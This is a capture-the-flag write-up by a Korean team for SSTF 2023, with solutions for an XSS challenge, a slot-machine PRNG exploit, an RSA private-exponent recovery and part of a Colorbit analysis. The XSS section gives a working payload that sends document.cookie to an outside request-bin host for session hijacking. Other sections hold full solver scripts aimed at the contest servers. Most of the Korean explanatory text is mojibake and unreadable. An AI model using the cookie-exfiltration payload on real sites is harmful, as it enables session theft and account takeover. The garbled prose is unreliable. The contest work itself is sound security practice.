# SSTF 2023 Write-Up

# Team Profile

---

- **Team name: *Cy + Kr (CyKor + PLUS + cat :flag_kr:)***
- **Rank : *3rd***
- **Nationality : *Republic of Korea*** ğŸ‡°ğŸ‡·

# Solved Challenges (except for survey & tutorials)

---

- **Pwn : 3 solve**
- **Web : 3 solve**
- **Rev : 1 solve**
- **Misc : 1 solve**
- **Crypto : 2 solve**

# Writeup

---

## XSS 101

XSS on login screen looks odd. First type some random username and password. Of course the login will fail, but the `Need help?` link shows up below the login button.

Following the link, we see a form asking email address and description. I guessed that the page is some kind of reporting system commonly found in XSS challenges, and assumed that the reporting system has trivial XSS vulnerability. I used this payload in description textarea: (you should replace `reqeuestbin url` with your own request bin URL in order to try out this payload.)

```html
<img src="xxx" onerror="var r=new XMLHttpRequest();r.open(`GET`,`requestbin url?c=`+document.cookie,false);r.send()">
```

After submitting the payload, my request bin showed this reqeust:

![Capture-2023-08-19-212027.png](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Capture-2023-08-19-212027.png)

As shown in the tutorial slides, I could access `/admin.php` after setting my browserâ€™s cookie to the retrieved one, and get the flag.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled.png)

## Sevenâ€™s Game - Metal

```c
__int64 __fastcall init_reel_strips(__int32 (*a1)[3][64])
{
  __int64 result; // rax
  int i; // [rsp+10h] [rbp-20h]
  int j; // [rsp+14h] [rbp-1Ch]
  int k; // [rsp+18h] [rbp-18h]

  for ( i = 0; i <= 2; ++i )
  {
    for ( j = 0; j <= 31; ++j )
    {
      (*a1)[(__int64)i][2 * j] = get_urandom(3u);
      (*a1)[(__int64)i][2 * j + 1] = 5;
    }
  }
  result = (unsigned int)USE_JACKPOT;
  if ( USE_JACKPOT )
  {
    for ( k = 0; k <= 2; ++k )
    {
      result = (int)(2 * get_urandom(0x20u));
      (*a1)[(__int64)k][result] = 3;
    }
  }
  return result;
}

```

reelì„ ì„¸íŒ…í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. 3ê°œì˜ ë¦´ì€ ê° 64ê°œì˜ ìˆ«ìë“¤ë¡œ ì´ë£¨ì–´ì ¸ ìˆê³ , ë¹ˆì¹¸ì„ ë‚˜íƒ€ë‚´ëŠ” 32ê°œì˜ 5ì™€ ì—¬ëŸ¬ ìƒ‰ì˜ 7ì„ ë‚˜íƒ€ë‚´ëŠ” 31ê°œì˜ 0~2, ê·¸ë¦¬ê³  ë‹¤ì´ì•„ëª¬ë“œë¥¼ ë‚˜íƒ€ë‚´ëŠ” 1ê°œì˜ 3ì´ ìˆìŠµë‹ˆë‹¤.

```c
unsigned __int64 play()
{
  int result_code_div_4; // eax
  float target_0; // [rsp+4h] [rbp-6Ch] BYREF
  float v3; // [rsp+8h] [rbp-68h]
  float v4; // [rsp+Ch] [rbp-64h]
  bet_info bet_info; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 canary; // [rsp+48h] [rbp-28h]

  canary = __readfsqword(0x28u);
  target_0 = 0.0;
  v3 = 0.0;
  v4 = 0.0;
  if ( bet <= money )
  {
    if ( total_spin < MAXIMUM_SPIN )
    {
      ++total_spin;
      bet_info.bet = bet;
      add_score(-bet);
      money -= (int)bet_info.bet;
      determine(&bet_info);
      money += (int)bet_info.result * (__int64)(int)bet_info.bet;
      if ( animation == 1 )
        spin((int *)bet_info.targets);
      add_score(bet * (__int64)(int)bet_info.result);
      target_0 = (float)(int)bet_info.targets[0];
      v3 = (float)(int)bet_info.targets[1];
      v4 = (float)(int)bet_info.targets[2];
      print_all(&target_0, 0xFFFFFFFFLL, animation == 1);
      if ( debug )
        printf(
          "bet : %d, result : %d, result_code : %d, targets : %d, %d, %d, symbol_count : %d, %d, %d, %d, %d, %d, %d\n",
          bet_info.bet,
          bet_info.result,
          bet_info.result_code,
          bet_info.targets[0],
          bet_info.targets[1],
          bet_info.targets[2],
          bet_info.symbol_count[0],
          bet_info.symbol_count[1],
          bet_info.symbol_count[2],
          bet_info.symbol_count[3],
          bet_info.symbol_count[4],
          bet_info.symbol_count[5],
          bet_info.symbol_count[6]);
      if ( (signed int)bet_info.result_code % 4 == 3 )
      {
        printf("Win 3 of ");
        result_code_div_4 = (signed int)bet_info.result_code / 4;
        if ( (signed int)bet_info.result_code / 4 == 1 )
        {
          printf("White");
        }
        else if ( result_code_div_4 > 1 )
        {
          if ( result_code_div_4 == 2 )
          {
            printf("Red");
          }
          else if ( result_code_div_4 == 6 )
          {
            printf("Mixed");
          }
        }
        else if ( !result_code_div_4 )
        {
          printf("Blue");
        }
        printf(" Sevens - Earn %d times of the difficulty!\n", bet_info.result);
      }
      else if ( bet_info.symbol_count[3] == 3 )
      {
        puts("Win the Jackpot!");
      }
    }
    else
    {
      puts("You have played too much!");
    }
  }
  else
  {
    puts("Your score is too low to play. Change your difficulty.");
  }
  return __readfsqword(0x28u) ^ canary;
}
```

1ë²ˆ ë©”ë‰´ì¸ play ë¥¼ ë¶„ì„í•´ë³´ë©´, determine í•¨ìˆ˜ë¥¼ í†µí•´ ë£°ë ›ì„ ëŒë¦¬ê³ , debugê°€ í™œì„±í™” ë˜ì–´ ìˆë‹¤ë©´, bet, result, result_code, targets, symbol_countë¥¼ ì¶œë ¥í•´ì¤ë‹ˆë‹¤.

```c
unsigned __int64 __fastcall determine(bet_info *bet_info)
{
  int random; // eax
  int v3; // [rsp+1Ch] [rbp-64h]
  int v4; // [rsp+1Ch] [rbp-64h]
  int v5; // [rsp+1Ch] [rbp-64h]
  signed int result; // [rsp+20h] [rbp-60h]
  unsigned int result_code; // [rsp+24h] [rbp-5Ch]
  __int32 i; // [rsp+28h] [rbp-58h]
  __int32 j; // [rsp+2Ch] [rbp-54h]
  __int32 k; // [rsp+30h] [rbp-50h]
  int m; // [rsp+34h] [rbp-4Ch]
  int n; // [rsp+38h] [rbp-48h]
  int v13; // [rsp+40h] [rbp-40h]
  int random_6[4]; // [rsp+44h] [rbp-3Ch]
  int v15; // [rsp+54h] [rbp-2Ch]
  __int64 v16; // [rsp+58h] [rbp-28h]
  __int64 v17; // [rsp+60h] [rbp-20h]
  int v18; // [rsp+68h] [rbp-18h]
  unsigned __int64 v19; // [rsp+78h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  v15 = 0;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0;
  result_code = 0;
  random = get_random();
  random_6[0] = random & 0x3F;
  random_6[1] = (random >> 6) & 0x3F;
  *(_QWORD *)&random_6[2] = (random >> 12) & 0x3F;
  v3 = 0;
  for ( i = 0; i < *strip_length; ++i )
  {
    v3 += strip_weight[i];
    if ( v3 > random_6[0] )
    {
      random_6[0] = i;
      break;
    }
  }
  v4 = 0;
  for ( j = 0; j < strip_length[1]; ++j )
  {
    v4 += qword_2053D8[j];
    if ( v4 > random_6[1] )
    {
      random_6[1] = j;
      break;
    }
  }
  v5 = 0;
  for ( k = 0; k < strip_length[2]; ++k )
  {
    v5 += qword_2053E0[k];
    if ( v5 > random_6[2] )
    {
      random_6[2] = k;
      break;
    }
  }
  for ( m = 0; m <= 2; ++m )
  {
    v13 = *(_DWORD *)(strips[m] + 4LL * random_6[m]);
    if ( v13 <= 2 )
      ++v18;
    ++random_6[v13 + 3];
  }
  result = 0;
  for ( n = 0; n <= 6; ++n )
  {
    bet_info->symbol_count[n] = random_6[n + 3];// symbol_count
    if ( result < *(_DWORD *)(paytable[n] + 4LL * random_6[n + 3]) )
    {
      result = *(_DWORD *)(paytable[n] + 4LL * random_6[n + 3]);
      result_code = 4 * n + random_6[n + 3];
    }
  }
  bet_info->result_code = result_code;          // result_code
  bet_info->result = result;                    // result
  bet_info->targets[0] = (2 * *strip_length + 2 * random_6[0] - 1) % (2 * *strip_length);// target1
  bet_info->targets[1] = (2 * random_6[1] - 1 + 2 * strip_length[1]) % (2 * strip_length[1]);// target2
  bet_info->targets[2] = (2 * random_6[2] - 1 + 2 * strip_length[2]) % (2 * strip_length[2]);// target3
  return __readfsqword(0x28u) ^ v19;
}
```

ê·¸ë¦¬ê³  determine í•¨ìˆ˜ëŠ” get_random í•¨ìˆ˜ë¡œ ê°€ì ¸ì˜¨ 24ë¹„íŠ¸ë¥¼ 6ë¹„íŠ¸ì”© ìª¼ê°  ê°’ë“¤ì„ ê° ë¦´ì˜ ì¸ë±ìŠ¤ë¡œ ì‚¬ìš©í•´ ê·¸ ê°’ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì—¬ê¸°ì„œ ê° ë¦´ì—ì„œ 3 ì„ ê³ ë¥¸ë‹¤ë©´, ë°°íŒ…ì•¡ì˜ 100000 ë°°ë¥¼ ê³±í•œ ì ìˆ˜ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì¶©ë¶„íˆ í° ê°’ (10000ì› ì •ë„)ì„ ë² íŒ…í•œë‹¤ë©´ ì¶©ë¶„í•œ ì ìˆ˜ë¥¼ ì–»ì„ ìˆ˜ ìˆì–´, 3ë²ˆ ë©”ë‰´ë¥¼ ì´ìš©í•´ í”Œë˜ê·¸ë¥¼ êµ¬ë§¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

```c
__int128 __usercall sigmoid@<xmm0>(double a1@<xmm0>)
{
  __int128 v1; // xmm1
  int i; // [rsp+14h] [rbp-14h]
  double v4; // [rsp+18h] [rbp-10h]
  double v5; // [rsp+20h] [rbp-8h]

  v4 = 1.0;
  v5 = 1.0;
  for ( i = 1; i <= 16; ++i )
  {
    v5 = v5 * a1 / (double)i;
    v4 = v4 + v5;
  }
  v1 = *(unsigned __int64 *)&v4;
  *(double *)&v1 = v4 / (v4 + 1.0);
  return v1;
}
```

get_random() ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ë¨¼ì € ì²« ë²ˆì§¸ forë¬¸ì€ $1+{x \over 1!}+{x^2 \over 2!}+\cdots+{x^{16} \over 16!}$ì„ ê³„ì‚°í•˜ë©°, ì´ëŠ” $e^x$ì˜ í…Œì¼ëŸ¬ ê¸‰ìˆ˜ë¥¼ 16ì°¨ê¹Œì§€ ì „ê°œí•œ í˜•íƒœì…ë‹ˆë‹¤. 

ë”°ë¼ì„œ, í•´ë‹¹ í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì€ ${e^x \over 1+e^x}$ ì´ë©°, ì‹œê·¸ëª¨ì´ë“œ í•¨ìˆ˜ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```c
__int64 get_random()
{
	// [1]
  for ( i = 0; i <= 19; ++i )
  {
    if ( (SEED & 1) != 0 )
      v0 = 0.5;                                 // 0.5
    else
      v0 = -0.5;                                // -0.5
    v8[i + 20] = v0;
    SEED >>= 1;
  }
	  //[2]                                      // v8[20 ~ 40]
  for ( j = 0; j <= 19; ++j )
  {
    v8[j] = 0.0;
    for ( k = 0; k <= 19; ++k )
      v8[j] = w1[j][k] * v8[k + 20] + v8[j];
    v8[j] = COERCE_DOUBLE(sigmoid(v8[j])) - 0.5;
  }
	  //[3]
  for ( m = 0; m <= 17; ++m )
  {
    v8[m + 20] = 0.0;
    for ( n = 0; n <= 19; ++n )
      v8[m + 20] = w2[m][n] * v8[n] + v8[m + 20];
    *(_QWORD *)&v8[m + 20] = sigmoid(v8[m + 20]);
  }
  SEED = 0;
	  // [4]
  for ( ii = 17; ii >= 0; --ii )
  {
    SEED *= 2;
    SEED |= v8[ii + 20] >= 0.5;
  }
  SEED *= 3;
  return SEED & 0x3FFFF;
}

```

get_random í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

1. SEED ê°’ì˜ 20ê°œ ë¹„íŠ¸ë¥¼ ê¸°ë°˜ìœ¼ë¡œ -0.5,0.5ë¡œ êµ¬ì„±ëœ ê¸¸ì´ 20ì§œë¦¬ input vector ìƒì„±
2. ëœë¤í•˜ê²Œ ìƒì„±ëœ 20x20 í–‰ë ¬ w1ì„ ê³±í•˜ì—¬ ìƒˆë¡œìš´ ê¸¸ì´ 20ì§œë¦¬ vector ìƒì„±
3. ì‹œê·¸ëª¨ì´ë“œ í•¨ìˆ˜ì— í•´ë‹¹ ê²°ê³¼ ê°’ë“¤ì„ ë„£ê³ , 0.5 ë¹¼ê¸°
4. ë‹¤ì‹œ ëœë¤í•˜ê²Œ ìƒì„±ëœ 18x20 í–‰ë ¬ w2ë¥¼ ê³±í•˜ì—¬ ê¸¸ì´ê°€ 18ì¸ ìƒˆë¡œìš´ vector ìƒì„±
5. ë§ˆì°¬ê°€ì§€ë¡œ ì‹œê·¸ëª¨ì´ë“œ í•¨ìˆ˜ì— í•´ë‹¹ ê²°ê³¼ ê°’ì„ ë„£ê³ , 0.5ì— ëŒ€í•´ ë¹„êµí•˜ì—¬ SEED ìƒì„±
6. ì–»ì€ SEEDì— 3ì„ ê³±í•˜ê³  &0x3FFFí•œ ê°’ì„ ë°˜í™˜.

ê³¼ì •ì„ ì •ë¦¬í•˜ë©´, get_randomì—ì„œ SEEDë¥¼ ìƒì„±í•˜ëŠ” ë°©ì‹ì´ ì¸ê³µ ì‹ ê²½ë§ê³¼ ìœ ì‚¬í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¼ SEED ê°’ì€ ìµœëŒ€ 570ë²ˆ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©°, ìœ„ì—ì„œ ì–¸ê¸‰í•œ targets ê°’ì„ ê°€ì§€ê³  SEED ê°’ì„ ì•Œ ìˆ˜ ìˆê³ , symbol_count 3ë²ˆì§¸ ì¸ë±ìŠ¤ ê°’ì„ ê°€ì§€ê³  JACKPOT ì— ë‹¹ì²¨ë˜ì–´ìˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```python
import torch
import torch.nn as nn
import torch.optim as optim

class MultiLabelClassificationNN(nn.Module):
    def __init__(self):
        super(MultiLabelClassificationNN, self).__init__()

        self.fc1 = nn.Linear(20, 20, bias=False)
        self.fc2 = nn.Linear(20, 18, bias=False)  # ì¶œë ¥ ë‰´ëŸ°ì„ 18ê°œë¡œ ì„¤ì •

    def forward(self, x):
        x = self.custom_activation(self.fc1(x))
        # ì¶œë ¥ ë ˆì´ì–´ì—ëŠ” í™œì„±í™” í•¨ìˆ˜ë¥¼ ì ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. BCEWithLogitsLossê°€ ë‚´ë¶€ì ìœ¼ë¡œ sigmoidë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤.
        x = self.fc2(x)
        return x
    def run_model(self, x):
        x = torch.tensor(int_to_bits(x, 20,isinput=True), dtype=torch.float32).unsqueeze(0)  # shape: (1, 20)

        # ëª¨ë¸ì˜ ì˜ˆì¸¡ ìˆ˜í–‰
        with torch.no_grad():
            model_output = model(x)
        predicted_probs = torch.sigmoid(model_output)
        predicted_labels = (predicted_probs > 0.5).int().tolist()[0]
        return bits_to_int(predicted_labels)
    def custom_activation(self, x):
        return torch.sigmoid(x) - 0.5

model = MultiLabelClassificationNN()
criterion = nn.BCEWithLogitsLoss()
optimizer = optim.Adam(model.parameters(), lr=0.005)
```

ë°”í€´ë¥¼ ì¬ë°œëª…í•˜ëŠ” ëŒ€ì‹  pytorchë¡œ ê°™ì€ êµ¬ì¡°ì˜ ì‹ ê²½ë§ì„ ë§Œë“¤ì–´, ì´ë¥¼ í•™ìŠµì‹œì¼œ ê²°ê³¼ ê°’ì„ ì˜ˆì¸¡í–ˆìŠµë‹ˆë‹¤. í™œì„±í™” í•¨ìˆ˜ëŠ” sigmoidì— 0.5ë¥¼ ë¹¼ë„ë¡ í–ˆê³ , ìƒìˆ˜ëŠ” ì—†ìœ¼ë¯€ë¡œ bias=False ì˜µì…˜ì„ ì£¼ì—ˆìŠµë‹ˆë‹¤.
ë˜í•œ ì¶œë ¥ ê°’ì´ ì‹¤ìˆ˜ê°€ ì•„ë‹Œ ë¶„ë¥˜ì— ê°€ê¹Œìš°ë¯€ë¡œ ì†ì‹¤ í•¨ìˆ˜ë¡œ BCEWithLogitsLossë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.

ì¶œë ¥ ê°’ì€ 0,1ì¤‘ í•˜ë‚˜, ì…ë ¥ ê°’ì€ -0.5, 0.5ì¤‘ í•˜ë‚˜ì„ì— ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. 

```python
from pwn import *
#"""
import torch
import torch.nn as nn
import torch.optim as optim
import random
def int_to_bits(x, num_bits,isinput=False):
    if isinput:
        return [int(i)-0.5 for i in format(x, '0' + str(num_bits) + 'b')]
    return [int(i) for i in format(x, '0' + str(num_bits) + 'b')]
def bits_to_int(bits):
    binary_str = ''.join(str(bit) for bit in bits)
    return int(binary_str, 2)

class MultiLabelClassificationNN(nn.Module):
    def __init__(self):
        super(MultiLabelClassificationNN, self).__init__()

        self.fc1 = nn.Linear(20, 20, bias=False)
        self.fc2 = nn.Linear(20, 18, bias=False)  # ì¶œë ¥ ë‰´ëŸ°ì„ 18ê°œë¡œ ì„¤ì •

    def forward(self, x):
        x = self.custom_activation(self.fc1(x))
        # ì¶œë ¥ ë ˆì´ì–´ì—ëŠ” í™œì„±í™” í•¨ìˆ˜ë¥¼ ì ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. BCEWithLogitsLossê°€ ë‚´ë¶€ì ìœ¼ë¡œ sigmoidë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤.
        x = self.fc2(x)
        return x
    def run_model(self, x):
        x = torch.tensor(int_to_bits(x, 20,isinput=True), dtype=torch.float32).unsqueeze(0)  # shape: (1, 20)

        # ëª¨ë¸ì˜ ì˜ˆì¸¡ ìˆ˜í–‰
        with torch.no_grad():
            model_output = model(x)
        predicted_probs = torch.sigmoid(model_output)
        predicted_labels = (predicted_probs > 0.5).int().tolist()[0]
        return bits_to_int(predicted_labels)
    def custom_activation(self, x):
        return torch.sigmoid(x) - 0.5

model = MultiLabelClassificationNN()
criterion = nn.BCEWithLogitsLoss()
optimizer = optim.Adam(model.parameters(), lr=0.005)
#"""
r = remote("sevensgamemetal.sstf.site", 7777)
#r = process(executable="./sevensgame",argv=["./sevensgame","1000000","100000","1"])
cand=[]
def get_info():
    global diacnt
    r.sendlineafter(b": \n", b"1")
    screendata=r.recvuntil(b"bet :",drop=True)
    data = r.recvline().strip()
    data = re.findall(b"\d+",data)
    ret = {}
    ret["bet"] = int(data[0])
    ret["result"] = int(data[1])
    ret["result_code"] = int(data[2])
    ret["targets"] = []
    for i in range(3,6):
        ret["targets"].append(int(data[i]))
    ret["symbol_count"] = []
    for i in range(6,len(data)):
        ret["symbol_count"].append(int(data[i]))
    ret["SEED"] = ((ret["targets"][0] + 1) // 2 )&0x3F
    ret["SEED"] |= (((ret["targets"][1] + 1) // 2)&0x3F) << 6
    ret["SEED"] |= (((ret["targets"][2] + 1) // 2)&0x3F) << 12
    assert ret["SEED"]<=0x3FFFF
    r.sendlineafter(b": \n",b"5")
    r.sendlineafter(b": \n",b"3")
    r.sendlineafter(b": \n",b"0")
    if ret["symbol_count"][3]:
        print(screendata.decode(),ret["targets"])
    return ret
    
    
    
def get_seed():
    return get_info()['SEED']
## settings
r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"2") ## turn off animation
r.sendlineafter(b": \n",b"5") ## debug mode
r.sendlineafter(b": \n",b"0")

import tqdm
inputs=[]
targets=[]
bet = 0
for rounds in tqdm.tqdm(range(30)):
    try:
        prev=random.randrange(0,0x40000)
        r.sendlineafter(b": \n",b"5")
        r.sendlineafter(b": \n",b"4") 
        r.sendlineafter(b"?\n",f"{prev}".encode()) 
        r.sendlineafter(b": \n",b"0")
        for _ in range(10):
            info = get_info()
            seed = info['SEED']
            bet = info['bet']
            real=seed*pow(3,-1,0x40000)&0x3FFFF
            seed=real*3
            inputs.append(int_to_bits(prev,20,isinput=True))
            targets.append(int_to_bits(real,18))
            prev=seed
    except:
        break
inputs = torch.tensor(inputs, dtype=torch.float32)
targets = torch.tensor(targets, dtype=torch.float32)

num_epochs = 1000
for epoch in (range(num_epochs)):
    # 1. Forward pass
    outputs = model(inputs)

    # 2. ì†ì‹¤ ê³„ì‚°
    loss = criterion(outputs, targets)

    # 3. Backward passì™€ íŒŒë¼ë¯¸í„° ì—…ë°ì´íŠ¸
    optimizer.zero_grad()
    loss.backward()
    optimizer.step()
    if (epoch+1) % 50 == 0:
        r.sendlineafter(b": \n",b"5")
        r.sendlineafter(b": \n",b"3")
        r.sendlineafter(b": \n",b"0")
        print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}')

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"0")

x=eval(input('diamond index : '))
print(x)

ans = ((x[0] + 1) // 2 )&0x3F
ans |= (((x[1] + 1) // 2)&0x3F) << 6
ans |= (((x[2] + 1) // 2)&0x3F) << 12

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"0")

final=[]
def reverse_model(ans):
    assert ans<=0x3FFFF
    for i in tqdm.tqdm(range(1<<20)):
        if i%100000==0:
            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"3")
            r.sendlineafter(b": \n",b"0")
        x=model.run_model(i)
        if bin(((x*3)&0x3FFFF)^ans).count('1') < 3:
            print(i)
            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"3")
            r.sendlineafter(b": \n",b"0")

            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"4") 
            r.sendlineafter(b"?\n",f"{i}".encode())
            r.sendlineafter(b": \n",b"0")

            if get_info()["symbol_count"][3]==3:
                print(bin((x*3)&0x3FFFF)[2:].zfill(18))
                print(bin(ans)[2:].zfill(18))
                print(bin(((x*3)&0x3FFFF)^ans)[2:].zfill(18))                
                return i
ans=reverse_model(ans)

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"4") 
r.sendlineafter(b"?\n",f"{ans}".encode())
r.sendlineafter(b": \n",b"0")

r.sendlineafter(b": \n",b"2")
r.sendlineafter(b"]\n",b"10000")

r.sendlineafter(b": \n",b"1")

r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"1")

r.interactive()
```

ì•Œê³ ë¦¬ì¦˜ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. 300ê°œì˜ ì…ì¶œë ¥ ìˆœì„œìŒì„ ì–»ì–´ì˜¨ë‹¤.
2. ì´ë¥¼ í†µí•´ ì‹ ê²½ë§ì„ í•™ìŠµì‹œí‚¨ë‹¤
3. 300ê°œì˜ ì…ì¶œë ¥ ìˆœì„œìŒì„ ì–»ì–´ì˜¤ëŠ” ê³¼ì •ì—ì„œ ì•Œì•„ë‚¸ ë‹¤ì´ì•„ëª¬ë“œì˜ ìœ„ì¹˜ë¥¼ ì§ì ‘ ì…ë ¥í•œë‹¤
4. 2^20ê°œì˜ ê°€ëŠ¥í•œ ì…ë ¥ì— ëŒ€í•´ ëª¨ë‘ ê²€ì¦í•´ë³´ë©´ì„œ, ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê²°ê³¼ì™€ 2ë¹„íŠ¸ ì´í•˜ ì°¨ì´ë‚˜ë©´ ì§ì ‘ í…ŒìŠ¤íŠ¸í•´ë³¸ë‹¤
5. ë‹¤ì´ì•„ 3ê°œê°€ ë‚˜ì˜¤ëŠ” ì¼€ì´ìŠ¤ë¥¼ ì°¾ìœ¼ë©´ ë² íŒ…ê¸ˆì•¡ì„ ë†’ì´ê³  ê²Œì„ì„ í•œ ë’¤, flagë¥¼ ì–»ì–´ë‚¸ë‹¤.

**FLAG : `SCTF{M4k3_y0ur_Own_1uck}`**

## meaas

exp, modë¥¼ ê°ê° d, nìœ¼ë¡œ ê³ ì •ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

modë¥¼ 2p+1=q ê¼´ì˜ ì‘ì€ ì†Œìˆ˜ë¡œ, baseëŠ” GF(q)ì— ëŒ€í•œ ìƒì„±ì›ìœ¼ë¡œ í•˜ë©´,

ìš°ë¦¬ëŠ” dë¥¼ 2pë¡œ ë‚˜ëˆˆ ë‚˜ë¨¸ì§€ë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ, ì—¬ëŸ¬ê°€ì§€ qì— ëŒ€í•´ ì´ë¥¼ ì‹œë„í•˜ê³ , CRTë¥¼ í†µí•´ dë¥¼ ê³„ì‚°í•´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```python
import requests
import json
from Crypto.Util.number import getPrime, long_to_bytes
from hashlib import sha512

n=142279362596553912224655297226700733514552660689709810513345154350345746185887515861123542614103888301543234469605744615437646435079188336249119463590058020792277090683637455303252433495716397344646744998042450363215302595987117906550802425441792299373794353320390613172040557615261705991448956653912780040873
e=11035971693989005873759402626999128461666359128625952822750674188152762293240126961360764634990950511241494197654313768345661411938605027938829794598142117
treasure=37390385431874189713613604490205529131497857010409452566115943008220420972423103673299513212626382905330650855094314574739903487
hint=0b110

def h(x,mod):
	data={"loglevel":"0","use_d":"true","use_n":"","mod":str(mod),"base":str(x)}
	r=requests.post("http://meaas.sstf.site/modexp",json=data)
	return json.loads(r.content)['res']
	
cand=[]
for _ in range(1,1500):
	q=Primes()[_]
	if q//2 in Primes():
		cand.append(q)
print(cand)
#í™€ìˆ˜..
a=[]
b=[]
for can in cand:
	F=GF(can,modulus="primitive")
	x=F.gen()
	y=F(h(ZZ(x),ZZ(can)))
	p=can//2
	l=ZZ(y.log(x))
	a.append(l)
	b.append(can//2)
d=crt(a,b)
print(d.nbits())

xor = lambda a, b: bytes([x^^y for x, y in zip(a, b)])
treasure=bytes.fromhex(hex(treasure)[2:])
flag=xor(sha512(long_to_bytes(d)).digest(),treasure)
print(flag)

```

**FLAG :** `SCTF{Even_tiny_clu3_c4n_d1$cl0sE_3veRythIn9_c3a23820}`

## Colorbit

```jsx
<script>
        let colors = [336, 230, 57, 160, 24, 313, 174, 173, 90, 62, 278, 78, 237, 359, 222, 64, 60, 122, 214, 256, 291, 186, 171, 187, 139, 79, 334, 120, 188, 102, 166, 157, 321, 9, 223, 19, 11, 133, 34, 192, 267, 44, 151, 216, 212, 315, 258, 126, 241, 281, 309, 97, 293, 39, 322, 282, 246, 244, 190, 172, 54, 47, 15, 36, 202, 247, 168, 26, 242, 38, 8, 30, 326, 339, 111, 304, 354, 239, 134, 76, 268, 20, 353, 45, 75, 319, 94, 131, 144, 200, 165, 229, 308, 1, 231, 61, 270, 196, 114, 161, 16, 81, 316, 175, 49, 3, 352, 53, 201, 99, 158, 7, 340, 335, 219, 194, 297, 146, 185, 116, 55, 31, 66, 51, 50, 106, 218, 182, 260, 205, 341, 273, 129, 103, 52, 197, 140, 211, 204, 337, 154, 95, 69, 294, 207, 276, 138, 342, 89, 299, 193, 264, 159, 279, 272, 325, 28, 348, 345, 18, 87, 92, 296, 96, 255, 347, 162, 226, 280, 110, 250, 70, 203, 82, 71, 132, 13, 145, 301, 259, 32, 137, 343, 243, 181, 23, 224, 210, 73, 238, 119, 252, 136, 215, 14, 257, 33, 338, 346, 351];
        function getRandomIntInclusive(min, max) {
          min = Math.ceil(min);
          max = Math.floor(max);
          return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function onChangeBox(e) {
          let value = document.getElementById("selectBox").value;
          document.getElementById("boxColor").value = colors[value];
        };
        
        function onApply() {
          let boxNum = document.getElementById("selectBox").value;
          let color = document.getElementById("boxColor").value;
          const boxClassName = `block${boxNum}`;
          for (let elem of document.getElementsByClassName(boxClassName)) {
            elem.style.backgroundColor = `hsl(${color}, ${getRandomIntInclusive(0,100)}%, ${getRandomIntInclusive(0,100)}%)`;
          };
          colors[boxNum] = color;
        };
    </script>
```

index.htmlì—ì„œ í¥ë¯¸ë¡œìš´ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

- stylesheetì— hsl color codeë¡œ ìƒ‰ì„ í‘œí˜„í•˜ëŠ” .block0ë¶€í„° .block399ê¹Œì§€ ìˆëŠ”ë° block[i]ì™€ block[i+200]ì€ vì™€ së§Œ ë‹¤ë¥´ë‹¤.
- ìŠ¤í¬ë¦½íŠ¸ì— ì •ì˜ëœ í•¨ìˆ˜ëŠ” .block0ë¶€í„° .block199ê¹Œì§€ hsl color codeë¡œ ìƒ‰ì„ ë³€ê²½í•  ìˆ˜ ìˆë‹¤.(colors ë°°ì—´ì´ 200 ê¸¸ì´ì„)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%201.png)

index.htmlì„ ì‹¤í–‰í•˜ë©´ ìœ„ ì´ë¯¸ì§€ì™€ ê°™ì€ë° ì´ëŠ” .blockì„ ìˆ˜ë§Œ ê°œ ë°°ì¹˜í•˜ì—¬ ë‚˜íƒ€ë‚˜ëŠ” ì´ë¯¸ì§€ì…ë‹ˆë‹¤. 

